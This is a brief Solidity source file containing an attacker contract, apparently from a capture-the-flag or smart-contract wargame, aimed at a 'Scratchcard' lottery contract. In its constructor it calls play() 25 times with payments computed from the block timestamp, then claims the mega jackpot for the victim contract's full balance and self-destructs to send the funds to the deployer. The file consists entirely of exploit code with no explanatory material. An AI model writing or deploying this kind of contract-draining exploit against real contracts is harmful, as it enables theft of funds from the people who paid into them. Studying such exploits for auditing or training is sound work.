pragma solidity 0.4.24;

//import "./Scratchcard.sol";

interface Scratchcard {
  function play() external payable;
  function checkIfMegaJackpotWinner() external returns(bool);
  function collectMegaJackpot(uint256 _amount) external;
  function () external payable;
}

contract scratchcardattack
{
    address public owner;
    address public victim_addr;
    Scratchcard scratch;

    constructor (address addr) public payable{
        //Remember our wallet address
        owner=msg.sender;
        
        //Rememberthe victim contract
        victim_addr = addr;
        
        scratch = Scratchcard(victim_addr);
        
        
        for(uint i = 0; i < 25; i++)
        {
            scratch.play.value((now%10**8)*10**10 )();
        }
        
        scratch.collectMegaJackpot(address(victim_addr).balance);
        selfdestruct(owner);
        
    }
   
    function () payable {} //Ensure we can get paid (very important)
   
    /*function cashOut() external
    {
         
        //Send ourselves the profits
        selfdestruct(owner);
    }*/
}
